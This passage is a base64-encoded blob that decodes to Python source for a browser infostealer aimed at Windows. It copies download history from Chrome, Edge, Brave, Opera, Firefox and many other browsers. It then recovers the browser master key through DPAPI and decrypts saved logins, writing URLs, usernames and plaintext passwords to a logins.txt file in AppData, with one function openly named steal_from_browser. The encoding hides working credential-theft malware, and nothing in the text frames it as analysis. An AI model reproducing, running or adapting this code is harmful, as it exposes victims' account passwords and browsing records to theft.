csICdVc2VyIERhdGEnLCAnRGVmYXVsdCcsICdIaXN0b3J5JyksDQogICAgICAgICJCcmF2ZSI6IG9zLnBhdGguam9pbihvcy5lbnZpcm9uWyJVU0VSUFJPRklMRSJdLCAnQXBwRGF0YScsICdMb2NhbCcsICdCcmF2ZVNvZnR3YXJlJywgJ0JyYXZlLUJyb3dzZXInLCAnVXNlciBEYXRhJywgJ0RlZmF1bHQnLCAnSGlzdG9yeScpLA0KICAgICAgICAiRWRnZSI6IG9zLnBhdGguam9pbihvcy5lbnZpcm9uWyJVU0VSUFJPRklMRSJdLCAnQXBwRGF0YScsICdMb2NhbCcsICdNaWNyb3NvZnQnLCAnRWRnZScsICdVc2VyIERhdGEnLCAnRGVmYXVsdCcsICdIaXN0b3J5JyksDQogICAgICAgICJPcGVyYSI6IG9zLnBhdGguam9pbihvcy5lbnZpcm9uWyJVU0VSUFJPRklMRSJdLCAnQXBwRGF0YScsICdSb2FtaW5nJywgJ09wZXJhIFNvZnR3YXJlJywgJ09wZXJhIFN0YWJsZScsICdIaXN0b3J5JyksDQogICAgICAgICJPcGVyYUdYIjogb3MucGF0aC5qb2luKG9zLmVudmlyb25bIlVTRVJQUk9GSUxFIl0sICdBcHBEYXRhJywgJ1JvYW1pbmcnLCAnT3BlcmEgU29mdHdhcmUnLCAnT3BlcmEgR1ggU3RhYmxlJywgJ0hpc3RvcnknKSwNCiAgICAgICAgIklyaWRpdW0iOiBvcy5wYXRoLmpvaW4ob3MuZW52aXJvblsiVVNFUlBST0ZJTEUiXSwgJ0FwcERhdGEnLCAnTG9jYWwnLCAnSXJpZGl1bScsICdVc2VyIERhdGEnLCAnRGVmYXVsdCcsICdIaXN0b3J5JyksDQogICAgICAgICJUYW5kZXgiOiBvcy5wYXRoLmpvaW4ob3MuZW52aXJvblsiVVNFUlBST0ZJTEUiXSwgJ0FwcERhdGEnLCAnTG9jYWwnLCAnVGFuZGV4JywgJ1VzZXIgRGF0YScsICdEZWZhdWx0JywgJ0hpc3RvcnknKSwNCiAgICAgICAgIlVyYW4iOiBvcy5wYXRoLmpvaW4ob3MuZW52aXJvblsiVVNFUlBST0ZJTEUiXSwgJ0FwcERhdGEnLCAnTG9jYWwnLCAnVXJhbicsICdVc2VyIERhdGEnLCAnRGVmYXVsdCcsICdIaXN0b3J5JyksDQogICAgICAgICJFcGljUHJpdmFjeUJyb3dzZXIiOiBvcy5wYXRoLmpvaW4ob3MuZW52aXJvblsiVVNFUlBST0ZJTEUiXSwgJ0FwcERhdGEnLCAnTG9jYWwnLCAnRXBpYyBQcml2YWN5IEJyb3dzZXInLCAnVXNlciBEYXRhJywgJ0RlZmF1bHQnLCAnSGlzdG9yeScpLA0KICAgICAgICAiVml2YWxkaSI6IG9zLnBhdGguam9pbihvcy5lbnZpcm9uWyJVU0VSUFJPRklMRSJdLCAnQXBwRGF0YScsICdMb2NhbCcsICdWaXZhbGRpJywgJ1VzZXIgRGF0YScsICdEZWZhdWx0JywgJ0hpc3RvcnknKSwNCiAgICAgICAgIlNwdXRuaWsiOiBvcy5wYXRoLmpvaW4ob3MuZW52aXJvblsiVVNFUlBST0ZJTEUiXSwgJ0FwcERhdGEnLCAnTG9jYWwnLCAnU3B1dG5paycsICdVc2VyIERhdGEnLCAnRGVmYXVsdCcsICdIaXN0b3J5JyksDQogICAgICAgICJBbWlnbyI6IG9zLnBhdGguam9pbihvcy5lbnZpcm9uWyJVU0VSUFJPRklMRSJdLCAnQXBwRGF0YScsICdMb2NhbCcsICdBbWlnbycsICdVc2VyIERhdGEnLCAnRGVmYXVsdCcsICdIaXN0b3J5JyksDQogICAgICAgICJUb3JjaCI6IG9zLnBhdGguam9pbihvcy5lbnZpcm9uWyJVU0VSUFJPRklMRSJdLCAnQXBwRGF0YScsICdMb2NhbCcsICdUb3JjaCcsICdVc2VyIERhdGEnLCAnRGVmYXVsdCcsICdIaXN0b3J5JyksDQogICAgICAgICJPcmJpdHVtIjogb3MucGF0aC5qb2luKG9zLmVudmlyb25bIlVTRVJQUk9GSUxFIl0sICdBcHBEYXRhJywgJ0xvY2FsJywgJ09yYml0dW0nLCAnVXNlciBEYXRhJywgJ0RlZmF1bHQnLCAnSGlzdG9yeScpLA0KICAgICAgICAiQ2VudEJyb3dzZXIiOiBvcy5wYXRoLmpvaW4ob3MuZW52aXJvblsiVVNFUlBST0ZJTEUiXSwgJ0FwcERhdGEnLCAnTG9jYWwnLCAnQ2VudEJyb3dzZXInLCAnVXNlciBEYXRhJywgJ0RlZmF1bHQnLCAnSGlzdG9yeScpLA0KICAgICAgICAiN1N0YXIiOiBvcy5wYXRoLmpvaW4ob3MuZW52aXJvblsiVVNFUlBST0ZJTEUiXSwgJ0FwcERhdGEnLCAnTG9jYWwnLCAnN1N0YXInLCAnVXNlciBEYXRhJywgJ0RlZmF1bHQnLCAnSGlzdG9yeScpDQogICAgfQ0KDQogICAgZmlyZWZveF9wcm9maWxlX3BhdGggPSBvcy5wYXRoLmpvaW4ob3MuZW52aXJvblsiVVNFUlBST0ZJTEUiXSwgJ0FwcERhdGEnLCAnUm9hbWluZycsICdNb3ppbGxhJywgJ0ZpcmVmb3gnLCAnUHJvZmlsZXMnKQ0KDQogICAgaWYgb3MucGF0aC5leGlzdHMoZmlyZWZveF9wcm9maWxlX3BhdGgpOg0KICAgICAgICBmaXJlZm94X3Byb2ZpbGVzID0gW2YgZm9yIGYgaW4gb3MubGlzdGRpcihmaXJlZm94X3Byb2ZpbGVfcGF0aCkgaWYgZi5lbmRzd2l0aCgnLmRlZmF1bHQtcmVsZWFzZScpXQ0KICAgICAgICBpZiBmaXJlZm94X3Byb2ZpbGVzOg0KICAgICAgICAgICAgZmlyZWZveF9oaXN0b3J5X3BhdGggPSBvcy5wYXRoLmpvaW4oZmlyZWZveF9wcm9maWxlX3BhdGgsIGZpcmVmb3hfcHJvZmlsZXNbMF0sICdwbGFjZXMuc3FsaXRlJykNCiAgICAgICAgZWxzZToNCiAgICAgICAgICAgIGZpcmVmb3hfaGlzdG9yeV9wYXRoID0gTm9uZQ0KICAgIGVsc2U6DQogICAgICAgIGZpcmVmb3hfaGlzdG9yeV9wYXRoID0gTm9uZQ0KDQogICAgd2l0aCBvcGVuKG91dHB1dF9maWxlX3BhdGgsICd3JywgZW5jb2Rpbmc9J3V0Zi04JykgYXMgZmlsZToNCiAgICAgICAgZmlsZS53cml0ZSgiPSIgKiA1MCArICJcbiIpDQoNCiAgICAgICAgZm9yIGJyb3dzZXIsIGhpc3RvcnlfcGF0aCBpbiBicm93c2Vycy5pdGVtcygpOg0KICAgICAgICAgICAgaWYgb3MucGF0aC5leGlzdHMoaGlzdG9yeV9wYXRoKToNCiAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgIHRlbXBfaGlzdG9yeV9wYXRoID0gb3MucGF0aC5qb2luKG9zLmVudmlyb25bIlVTRVJQUk9GSUxFIl0sICdBcHBEYXRhJywgZid7YnJvd3Nlcn1fZG93bmxvYWRzX2NvcHkuZGInKQ0KICAgICAgICAgICAgICAgICAgICBzaHV0aWwuY29weShoaXN0b3J5X3BhdGgsIHRlbXBfaGlzdG9yeV9wYXRoKQ0KDQogICAgICAgICAgICAgICAgICAgIGNvbm4gPSBzcWxpdGUzLmNvbm5lY3QodGVtcF9oaXN0b3J5X3BhdGgpDQogICAgICAgICAgICAgICAgICAgIGN1cnNvciA9IGNvbm4uY3Vyc29yKCkNCg0KICAgICAgICAgICAgICAgICAgICBjdXJzb3IuZXhlY3V0ZSgiU0VMRUNUIHRhcmdldF9wYXRoLCBzdGFydF90aW1lLCBlbmRfdGltZSwgcmVjZWl2ZWRfYnl0ZXMsIHRvdGFsX2J5dGVzLCBzdGF0ZSBGUk9NIGRvd25sb2FkcyIpDQoNCiAgICAgICAgICAgICAgICAgICAgZmlsZS53cml0ZShmIlxueyc9JyoyMH0ge2Jyb3dzZXJ9IHsnPScqMjB9XG4iKQ0KICAgICAgICAgICAgICAgICAgICBmb3Igcm93IGluIGN1cnNvci5mZXRjaGFsbCgpOg0KICAgICAgICAgICAgICAgICAgICAgICAgdGFyZ2V0X3BhdGggPSByb3dbMF0NCiAgICAgICAgICAgICAgICAgICAgICAgIHN0YXJ0X3RpbWUgPSByb3dbMV0NCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZF90aW1lID0gcm93WzJdDQogICAgICAgICAgICAgICAgICAgICAgICByZWNlaXZlZF9ieXRlcyA9IHJvd1szXQ0KICAgICAgICAgICAgICAgICAgICAgICAgdG90YWxfYnl0ZXMgPSByb3dbNF0NCiAgICAgICAgICAgICAgICAgICAgICAgIHN0YXRlID0gcm93WzVdDQoNCiAgICAgICAgICAgICAgICAgICAgICAgIHN0YXJ0X3RpbWUgPSBzdGFydF90aW1lIC8gMTAwMDAwMCAtIDExNjQ0NDczNjAwDQogICAgICAgICAgICAgICAgICAgICAgICBzdGFydF9kYXRlID0gdGltZS5zdHJmdGltZSgnJVktJW0tJWQgJUg6JU06JVMnLCB0aW1lLmxvY2FsdGltZShzdGFydF90aW1lKSkNCg0KICAgICAgICAgICAgICAgICAgICAgICAgZmlsZS53cml0ZShmIkFyY2hpdm8gZ3VhcmRhZG8gZW46IHt0YXJnZXRfcGF0aH1cbiIpDQogICAgICAgICAgICAgICAgICAgICAgICBmaWxlLndyaXRlKGYiRmVjaGEgZGUgaW5pY2lvOiB7c3RhcnRfZGF0ZX1cbiIpDQogICAgICAgICAgICAgICAgICAgICAgICBmaWxlLndyaXRlKGYiQnl0ZXMgcmVjaWJpZG9zOiB7cmVjZWl2ZWRfYnl0ZXN9XG4iKQ0KICAgICAgICAgICAgICAgICAgICAgICAgZmlsZS53cml0ZShmIlRhbWHDsW8gdG90YWw6IHt0b3RhbF9ieXRlc31cbiIpDQogICAgICAgICAgICAgICAgICAgICAgICBmaWxlLndyaXRlKGYiRXN0YWRvIGRlIGxhIGRlc2NhcmdhOiB7J0NvbXBsZXRhZGEnIGlmIHN0YXRlID09IDEgZWxzZSAnRW4gY3Vyc28nfVxuIikNCiAgICAgICAgICAgICAgICAgICAgICAgIGZpbGUud3JpdGUoIi0iICogNTAgKyAiXG4iKQ0KDQogICAgICAgICAgICAgICAgICAgIGN1cnNvci5jbG9zZSgpDQogICAgICAgICAgICAgICAgICAgIGNvbm4uY2xvc2UoKQ0KDQogICAgICAgICAgICAgICAgICAgIG9zLnJlbW92ZSh0ZW1wX2hpc3RvcnlfcGF0aCkNCiAgICAgICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6DQogICAgICAgICAgICAgICAgICAgIGZpbGUud3JpdGUoZiJbRXJyb3IgcHJvY2VzYW5kbyB7YnJvd3Nlcn1dOiB7c3RyKGUpfVxuIikNCiAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgZmlsZS53cml0ZShmInticm93c2VyfTogTm8gc2UgZW5jb250csOzIGVsIGhpc3RvcmlhbCBkZSBkZXNjYXJnYXMuXG4iKQ0KICAgICAgICANCiAgICAgICAgaWYgZmlyZWZveF9oaXN0b3J5X3BhdGg6DQogICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgdGVtcF9oaXN0b3J5X3BhdGggPSBvcy5wYXRoLmpvaW4ob3MuZW52aXJvblsiVVNFUlBST0ZJTEUiXSwgJ0FwcERhdGEnLCAnZmlyZWZveF9kb3dubG9hZHNfY29weS5kYicpDQogICAgICAgICAgICAgICAgc2h1dGlsLmNvcHkoZmlyZWZveF9oaXN0b3J5X3BhdGgsIHRlbXBfaGlzdG9yeV9wYXRoKQ0KDQogICAgICAgICAgICAgICAgY29ubiA9IHNxbGl0ZTMuY29ubmVjdCh0ZW1wX2hpc3RvcnlfcGF0aCkNCiAgICAgICAgICAgICAgICBjdXJzb3IgPSBjb25uLmN1cnNvcigpDQoNCiAgICAgICAgICAgICAgICBjdXJzb3IuZXhlY3V0ZSgiU0VMRUNUIHRhcmdldFBhdGgsIHNvdXJjZSwgc3RhcnRUaW1lLCBlbmRUaW1lLCByZWNlaXZlZEJ5dGVzLCB0b3RhbEJ5dGVzLCBzdGF0ZSBGUk9NIG1vel9kb3dubG9hZHMiKQ0KDQogICAgICAgICAgICAgICAgZmlsZS53cml0ZShmIlxueyc9JyoyMH0gRmlyZWZveCB7Jz0nKjIwfVxuIikNCiAgICAgICAgICAgICAgICBmb3Igcm93IGluIGN1cnNvci5mZXRjaGFsbCgpOg0KICAgICAgICAgICAgICAgICAgICB0YXJnZXRfcGF0aCA9IHJvd1swXQ0KICAgICAgICAgICAgICAgICAgICB1cmwgPSByb3dbMV0NCiAgICAgICAgICAgICAgICAgICAgc3RhcnRfdGltZSA9IHJvd1syXQ0KICAgICAgICAgICAgICAgICAgICByZWNlaXZlZF9ieXRlcyA9IHJvd1s0XQ0KICAgICAgICAgICAgICAgICAgICB0b3RhbF9ieXRlcyA9IHJvd1s1XQ0KICAgICAgICAgICAgICAgICAgICBzdGF0ZSA9IHJvd1s2XQ0KDQogICAgICAgICAgICAgICAgICAgIHN0YXJ0X2RhdGUgPSB0aW1lLnN0cmZ0aW1lKCclWS0lbS0lZCAlSDolTTolUycsIHRpbWUubG9jYWx0aW1lKHN0YXJ0X3RpbWUgLyAxMDAwKSkNCg0KICAgICAgICAgICAgICAgICAgICBmaWxlLndyaXRlKGYiQXJjaGl2byBndWFyZGFkbyBlbjoge3RhcmdldF9wYXRofVxuIikNCiAgICAgICAgICAgICAgICAgICAgZmlsZS53cml0ZShmIlVSTCBkZSBsYSBkZXNjYXJnYToge3VybH1cbiIpDQogICAgICAgICAgICAgICAgICAgIGZpbGUud3JpdGUoZiJGZWNoYSBkZSBpbmljaW86IHtzdGFydF9kYXRlfVxuIikNCiAgICAgICAgICAgICAgICAgICAgZmlsZS53cml0ZShmIkJ5dGVzIHJlY2liaWRvczoge3JlY2VpdmVkX2J5dGVzfVxuIikNCiAgICAgICAgICAgICAgICAgICAgZmlsZS53cml0ZShmIlRhbWHDsW8gdG90YWw6IHt0b3RhbF9ieXRlc31cbiIpDQogICAgICAgICAgICAgICAgICAgIGZpbGUud3JpdGUoZiJFc3RhZG8gZGUgbGEgZGVzY2FyZ2E6IHsnQ29tcGxldGFkYScgaWYgc3RhdGUgPT0gMSBlbHNlICdFbiBjdXJzbyd9XG4iKQ0KICAgICAgICAgICAgICAgICAgICBmaWxlLndyaXRlKCItIiAqIDUwICsgIlxuIikNCg0KICAgICAgICAgICAgICAgIGN1cnNvci5jbG9zZSgpDQogICAgICAgICAgICAgICAgY29ubi5jbG9zZSgpDQoNCiAgICAgICAgICAgICAgICBvcy5yZW1vdmUodGVtcF9oaXN0b3J5X3BhdGgpDQogICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6DQogICAgICAgICAgICAgICAgZmlsZS53cml0ZShmIltFcnJvciBwcm9jZXNhbmRvIEZpcmVmb3hdOiB7c3RyKGUpfVxuIikNCiAgICAgICAgZWxzZToNCiAgICAgICAgICAgIGZpbGUud3JpdGUoIkZpcmVmb3g6IE5vIHNlIGVuY29udHLDsyBlbCBoaXN0b3JpYWwgZGUgZGVzY2FyZ2FzLlxuIikNCg0KDQpkZWYgZ2V0X2VuY3J5cHRpb25fa2V5KGxvY2FsX3N0YXRlX3BhdGgpOg0KICAgIHdpdGggb3Blbihsb2NhbF9zdGF0ZV9wYXRoLCAncicsIGVuY29kaW5nPSd1dGYtOCcpIGFzIGY6DQogICAgICAgIGxvY2FsX3N0YXRlID0ganNvbi5sb2FkKGYpDQogICAgZW5jcnlwdGVkX2tleSA9IGJhc2U2NC5iNjRkZWNvZGUobG9jYWxfc3RhdGVbIm9zX2NyeXB0Il1bImVuY3J5cHRlZF9rZXkiXSkNCiAgICBlbmNyeXB0ZWRfa2V5ID0gZW5jcnlwdGVkX2tleVs1Ol0NCiAgICBrZXkgPSB3aW4zMmNyeXB0LkNyeXB0VW5wcm90ZWN0RGF0YShlbmNyeXB0ZWRfa2V5LCBOb25lLCBOb25lLCBOb25lLCAwKVsxXQ0KICAgIHJldHVybiBrZXkNCg0KZGVmIGRlY3J5cHRfcGFzc3dvcmQoYnVmZiwga2V5KToNCiAgICB0cnk6DQogICAgICAgIGlmIGJ1ZmZbOjNdID09IGIndjEwJzoNCiAgICAgICAgICAgIGl2ID0gYnVmZlszOjE1XQ0KICAgICAgICAgICAgcGF5bG9hZCA9IGJ1ZmZbMTU6LTE2XQ0KICAgICAgICAgICAgdGFnID0gYnVmZlstMTY6XQ0KDQogICAgICAgICAgICBjaXBoZXIgPSBBRVMubmV3KGtleSwgQUVTLk1PREVfR0NNLCBpdikNCiAgICAgICAgICAgIGRlY3J5cHRlZF9wYXNzID0gY2lwaGVyLmRlY3J5cHRfYW5kX3ZlcmlmeShwYXlsb2FkLCB0YWcpDQogICAgICAgICAgICByZXR1cm4gZGVjcnlwdGVkX3Bhc3MuZGVjb2RlKCd1dGYtOCcpDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICByZXR1cm4gd2luMzJjcnlwdC5DcnlwdFVucHJvdGVjdERhdGEoYnVmZiwgTm9uZSwgTm9uZSwgTm9uZSwgMClbMV0uZGVjb2RlKCkNCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6DQogICAgICAgIHJldHVybiAiW0VSUk9SIGRlY3J5cHRpbmddIg0KDQpkZWYgZmluZF9wcm9maWxlX3BhdGgoYmFzZV9wYXRoKToNCiAgICAjIFNpIGVsIExvZ2luIERhdGEgZXN0w6EgZGlyZWN0YW1lbnRlIGVuIGJhc2VfcGF0aCAoY29tbyBlbiBPcGVyYSBHWCksIMO6c2Fsbw0KICAgIGxvZ2luX3BhdGggPSBvcy5wYXRoLmpvaW4oYmFzZV9wYXRoLCAiTG9naW4gRGF0YSIpDQogICAgaWYgb3MucGF0aC5leGlzdHMobG9naW5fcGF0aCk6DQogICAgICAgIHJldHVybiBsb2dpbl9wYXRoLCAiRGVmYXVsdCIgICMgbyB1c2EgIlJvb3QiIG8gIk9wZXJhR1giDQogICAgDQogICAgIyBTaSBoYXkgcGVyZmlsZXMgKENocm9tZSwgRWRnZSwgZXRjLikNCiAgICBwcm9maWxlcyA9IFsiRGVmYXVsdCIsICJQcm9maWxlIDEiLCAiUHJvZmlsZSAyIiwgIlByb2ZpbGUgMyJdDQogICAgZm9yIHByb2ZpbGUgaW4gcHJvZmlsZXM6DQogICAgICAgIGxvZ2luX3BhdGggPSBvcy5wYXRoLmpvaW4oYmFzZV9wYXRoLCBwcm9maWxlLCAiTG9naW4gRGF0YSIpDQogICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKGxvZ2luX3BhdGgpOg0KICAgICAgICAgICAgcmV0dXJuIGxvZ2luX3BhdGgsIHByb2ZpbGUNCiAgICByZXR1cm4gTm9uZSwgTm9uZQ0KDQpkZWYgc3RlYWxfZnJvbV9icm93c2VyKGJyb3dzZXJfbmFtZSwgYmFzZV9wYXRoLCBsb2NhbF9zdGF0ZV9wYXRoLCBmaWxlX2hhbmRsZSk6DQogICAgbG9naW5fZGF0YV9wYXRoLCBwcm9maWxlID0gZmluZF9wcm9maWxlX3BhdGgoYmFzZV9wYXRoKQ0KICAgIGlmIG5vdCBsb2dpbl9kYXRhX3BhdGg6DQogICAgICAgIHJldHVybg0KICAgIHRyeToNCiAgICAgICAga2V5ID0gZ2V0X2VuY3J5cHRpb25fa2V5KGxvY2FsX3N0YXRlX3BhdGgpDQogICAgICAgIHRlbXBfY29weSA9IGYie2Jyb3dzZXJfbmFtZX1fdGVtcC5kYiINCiAgICAgICAgc2h1dGlsLmNvcHkyKGxvZ2luX2RhdGFfcGF0aCwgdGVtcF9jb3B5KQ0KICAgICAgICBkYiA9IHNxbGl0ZTMuY29ubmVjdCh0ZW1wX2NvcHkpDQogICAgICAgIGN1cnNvciA9IGRiLmN1cnNvcigpDQogICAgICAgIGN1cnNvci5leGVjdXRlKCJTRUxFQ1Qgb3JpZ2luX3VybCwgdXNlcm5hbWVfdmFsdWUsIHBhc3N3b3JkX3ZhbHVlIEZST00gbG9naW5zIikNCg0KICAgICAgICBmaWxlX2hhbmRsZS53cml0ZShmIlxuXG57Jz0nKjIwfSB7YnJvd3Nlcl9uYW1lfSAoe3Byb2ZpbGV9KSB7Jz0nKjIwfVxuXG4iKQ0KDQogICAgICAgIGZvciByb3cgaW4gY3Vyc29yLmZldGNoYWxsKCk6DQogICAgICAgICAgICB1cmwgPSByb3dbMF0NCiAgICAgICAgICAgIHVzZXJuYW1lID0gcm93WzFdDQogICAgICAgICAgICBwYXNzd29yZCA9IGRlY3J5cHRfcGFzc3dvcmQocm93WzJdLCBrZXkpDQoNCiAgICAgICAgICAgIGlmIHVzZXJuYW1lIG9yIHBhc3N3b3JkOg0KICAgICAgICAgICAgICAgIGZpbGVfaGFuZGxlLndyaXRlKGYnVVJMOiB7dXJsfVxuJykNCiAgICAgICAgICAgICAgICBmaWxlX2hhbmRsZS53cml0ZShmJ1VzZXJuYW1lOiB7dXNlcm5hbWV9XG4nKQ0KICAgICAgICAgICAgICAgIGZpbGVfaGFuZGxlLndyaXRlKGYnUGFzc3dvcmQ6IHtwYXNzd29yZH1cbicpDQogICAgICAgICAgICAgICAgZmlsZV9oYW5kbGUud3JpdGUoJy0nKjUwICsgJ1xuJykNCiAgICAgICAgDQogICAgICAgIGN1cnNvci5jbG9zZSgpDQogICAgICAgIGRiLmNsb3NlKCkNCiAgICAgICAgb3MucmVtb3ZlKHRlbXBfY29weSkNCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6DQogICAgICAgIHBhc3MNCg0KZGVmIGdldF9sb2dpbnMoKToNCiAgICBvdXRwdXRfZm9sZGVyID0gb3MucGF0aC5qb2luKG9zLmVudmlyb25bIlVTRVJQUk9GSUxFIl0sICdBcHBEYXRhJykNCiAgICBvcy5tYWtlZGlycyhvdXRwdXRfZm9sZGVyLCBleGlzdF9vaz1UcnVlKQ0KICAgIG91dHB1dF9maWxlID0gb3MucGF0aC5qb2luKG91dHB1dF9mb2xkZXIsICdsb2dpbnMudHh0JykNCg0KICAgIGJyb3dzZXJzID0gew0KICAgICAgICAiQ2hyb21lIjogew0KICAgICAgICAgICAgImJhc2VfcGF0aCI6IG9zLnBhdGguam9pbihvcy5lbnZpcm9uWyJVU0VSUFJPRklMRSJdLCAiQXBwRGF0YSIsICJMb2NhbCIsICJHb29nbGUiLCAiQ2hyb21lIiwgIlVzZXIgRGF0YSIpLA0KICAgICAgICAgICAgImxvY2FsX3N0YXRlIjogb3MucGF0aC5qb2luKG9zLmVudmlyb25bIlVTRVJQUk9GSUxFIl0sICJBcHBEYXRhIiwgIkxvY2FsIiwgIkdvb2dsZSIsICJDaHJvbWUiLCAiVXNlciBEYXRhIiwgIkxvY2FsIFN0YXRlIikNCiAgICAgICAgfSwNCiAgICAgICAgIkNocm9tZSBTeFMiOiB7DQogICAgICAgICAgICAiYmFzZV9wYXRoIjogb3MucGF0aC5qb2luKG9zLmVudmlyb25bIlVTRVJQUk9GSUxFIl0sICJBcHBEYXRhIiwgIkxvY2FsIiwgIkdvb2dsZSIsICJDaHJvbWUgU3hTIiwgIlVzZXIgRGF0YSIpLA0KICAgICAgICAgICAgImxvY2FsX3N0YXRlIjogb3MucGF0aC5qb2luKG9zLmVudmlyb25bIlVTRVJQUk9GSUxFIl0sICJBcHBEYXRhIiwgIkxvY2FsIiwgIkdvb2dsZSIsICJDaHJvbWUgU3hTIiwgIlVzZXIgRGF0YSIsICJMb2NhbCBTdGF0ZSIpDQogICAgICAgIH0sDQogICAgICAgICJDaHJvbWUgMSI6IHsNCiAgICAgICAgICAgICJiYXNlX3BhdGgiOiBvcy5wYXRoLmpvaW4ob3MuZW52aXJvblsiVVNFUlBST0ZJTEUiXSwgIkFwcERhdGEiLCAiTG9jYWwiLCAiR29vZ2xlIiwgIkNocm9tZSIsICJVc2VyIERhdGEiKSwNCiAgICAgICAgICAgICJsb2NhbF9zdGF0ZSI6IG9zLnBhdGguam9pbihvcy5lbnZpcm9uWyJVU0VSUFJPRklMRSJdLCAiQXBwRGF0YSIsICJMb2NhbCIsICJHb29nbGUiLCAiQ2hyb21lIiwgIlVzZXIgRGF0YSIsICJMb2NhbCBTdGF0ZSIpDQogICAgICAgIH0sDQogICAgICAgICJDaHJvbWUgMiI6IHsNCiAgICAgICAgICAgICJiYXNlX3BhdGgiOiBvcy5wYXRoLmpvaW4ob3MuZW52aXJvblsiVVNFUlBST0ZJTEUiXSwgIkFwcERhdGEiLCAiTG9jYWwiLCAiR29vZ2xlIiwgIkNocm9tZSIsICJVc2VyIERhdGEiKSwNCiAgICAgICAgICAgICJsb2NhbF9zdGF0ZSI6IG9zLnBhdGguam9pbihvcy5lbnZpcm9uWyJVU0VSUFJPRklMRSJdLCAiQXBwRGF0YSIsICJMb2NhbCIsICJHb29nbGUiLCAiQ2hyb21lIiwgIlVzZXIgRGF0YSIsICJMb2NhbCBTdGF0ZSIpDQogICAgICAgIH0sDQogICAgICAgICJDaHJvbWUgMyI6IHsNCiAgICAgICAgICAgICJiYXNlX3BhdGgiOiBvcy5wYXRoLmpvaW4ob3MuZW52aXJvblsiVVNFUlBST0ZJTEUiXSwgIkFwcERhdGEiLCAiTG9jYWwiLCAiR29vZ2xlIiwgIkNocm9tZSIsICJVc2VyIERhdGEiKSwNCiAgICAgICAgICAgICJsb2NhbF9zdGF0ZSI6IG9zLnBhdGguam9pbihvcy5lbnZpcm9uWyJVU0VSUFJPRklMRSJdLCAiQXBwRGF0YSIsICJMb2NhbCIsICJHb29nbGUiLCAiQ2hyb21lIiwgIlVzZXIgRGF0YSIsICJMb2NhbCBTdGF0ZSIpDQogICAgICAgIH0sDQogICAgICAgICJDaHJvbWUgNCI6IHsNCiAgICAgICAgICAgICJiYXNlX3BhdGgiOiBvcy5wYXRoLmpvaW4ob3MuZW52aXJvblsiVVNFUlBST0ZJTEUiXSwgIkFwcERhdGEiLCAiTG9jYWwiLCAiR29vZ2xlIiwgIkNocm9tZSIsICJVc2VyIERhdGEiKSwNCiAgICAgICAgICAgICJsb2NhbF9zdGF0ZSI6IG9zLnBhdGguam9pbihvcy5lbnZpcm9uWyJVU0VSUFJPRklMRSJdLCAiQXBwRGF0YSIsICJMb2NhbCIsICJHb29nbGUiLCAiQ2hyb21lIiwgIlVzZXIgRGF0YSIsICJMb2NhbCBTdGF0ZSIpDQogICAgICAgIH0sDQogICAgICAgICJDaHJvbWUgNSI6IHsNCiAgICAgICAgICAgICJiYXNlX3BhdGgiOiBvcy5wYXRoLmpvaW4ob3MuZW52aXJvblsiVVNFUlBST0ZJTEUiXSwgIkFwcERhdGEiLCAiTG9jYWwiLCAiR29vZ2xlIiwgIkNocm9tZSIsICJVc2VyIERhdGEiKSwNCiAgICAgICAgICAgICJsb2NhbF9zdGF0ZSI6IG9zLnBhdGguam9pbihvcy5lbnZpcm9uWyJVU0VSUFJPRklMRSJdLCAiQXBwRGF0YSIsICJMb2NhbCIsICJHb29nbGUiLCAiQ2hyb21lIiwgIlVzZXIgRGF0YSIsICJMb2NhbCBTdGF0ZSIpDQogICAgICAgIH0sDQogICAgICAgICJFZGdlIjogew0KICAgICAgICAgICAgImJhc2VfcGF0aCI6IG9zLnBhdGguam9pbihvcy5lbnZpcm9uWyJVU0VSUFJPRklMRSJdLCAiQXBwRGF0YSIsICJMb2NhbCIsICJNaWNyb3NvZnQiLCAiRWRnZSIsICJVc2VyIERhdGEiKSwNCiAgICAgICAgICAgICJsb2NhbF9zdGF0ZSI6IG9zLnBhdGguam9pbihvcy5lbnZpcm9uWyJVU0VSUFJPRklMRSJdLCAiQXBwRGF0YSIsICJMb2NhbCIsICJNaWNyb3NvZnQiLCAiRWRnZSIsICJVc2VyIERhdGEiLCAiTG9jYWwgU3RhdGUiKQ0KICAgICAgICB9LA0KICAgICAgICAiT3BlcmEiOiB7DQogICAgICAgICAgICAiYmFzZV9wYXRoIjogb3MucGF0aC5qb2luKG9zLmVudmlyb25bIlVTRVJQUk9GSUxFIl0sICJBcHBEYXRhIiwgIlJvYW1pbmciLCAiT3BlcmEgU29mdHdhcmUiLCAiT3BlcmEgU3RhYmxlIiksDQogICAgICAgICAgICAibG9jYWxfc3RhdGUiOiBvcy5wYXRoLmpvaW4ob3MuZW52aXJvblsiVVNFUlBST0ZJTEUiXSwgIkFwcERhdGEiLCAiUm9hbWluZyIsICJPcGVyYSBTb2Z0d2FyZSIsICJPcGVyYSBTdGFibGUiLCAiTG9jYWwgU3RhdGUiKQ0KICAgICAgICB9LA0KICAgICAgICAiT3BlcmFHWCI6IHsNCiAgICAgICAgICAgICJiYXNlX3BhdGgiOiBvcy5wYXRoLmpvaW4ob3MuZW52aXJvblsiVVNFUlBST0ZJTEUiXSwgIkFwcERhdGEiLCAiUm9hbWluZyIsICJPcGVyYSBTb2Z0d2FyZSIsICJPcGVyYSBHWCBTdGFibGUiKSwNCiAgICAgICAgICAgICJsb2NhbF9zdGF0ZSI6IG9zLnBhdGguam9pbihvcy5lbnZpcm9uWyJVU0VSUFJPRklMRSJdLCAiQXBwRGF0YSIsICJSb2FtaW5nIiwgIk9wZXJhIFNvZnR3YXJlIiwgIk9wZXJhIEdYIFN0YWJsZSIsICJMb2NhbCBTdGF0ZSIpDQogICAgICAgIH0sDQogICAgICAgICJCcmF2ZSI6IHsNCiAgICAgICAgICAgICJiYXNlX3BhdGgiOiBvcy5wYXRoLmpvaW4ob3MuZW52aXJvblsiVVNFUlBST0ZJTEUiXSwgIkFwcERhdGEiLCAiTG9jYWwiLCAiQnJhdmVTb2Z0d2FyZSIsICJCcmF2ZS1Ccm93c2VyIiwgIlVzZXIgRGF0YSIpLA0KIC